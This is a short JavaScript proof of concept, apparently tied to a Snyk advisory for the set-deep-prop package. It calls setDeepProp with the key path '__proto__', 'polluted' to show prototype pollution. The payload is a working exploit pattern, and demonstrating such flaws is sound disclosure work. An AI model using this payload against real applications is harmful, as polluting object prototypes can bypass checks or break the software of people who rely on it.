//https://snyk.io/vuln/SNYK-JS-SETDEEPPROP-1083231
  const setDeepProp = require("set-deep-prop");
  var obj = {};

  setDeepProp({}, ["__proto__", "polluted"], "yes");
